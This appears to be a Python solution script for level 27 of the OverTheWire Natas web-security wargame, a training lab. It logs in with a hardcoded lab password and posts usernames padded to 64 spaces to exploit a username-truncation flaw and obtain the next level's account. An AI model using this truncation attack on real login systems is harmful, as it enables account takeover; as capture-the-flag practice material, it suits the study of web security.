import sys
import requests as req

username = "natas27"
password = "PSO8xysPi00WKIiZZ6s6PtRmFy9cbxj3"
url = "http://%s.natas.labs.overthewire.org/" % username

SPACE = " "
SPACES = 1

def log_in(s, data):
	r = s.post(url, auth=(username, password), data=data, cookies={})
	print(r.text)
	print(r.headers)
	return r


s = req.session()

u = "natas28"
p = ""

for i in range(0, 1):
	"""
	data = {"username": u, "password": "secret"}
	log_in(s, data)
	"""
	data = {"username": u + SPACE * (64-len(u)) + "x", "password": ""}
	log_in(s, data)
	data = {"username": u + SPACE * (64-len(u)), "password": ""}
	log_in(s, data)
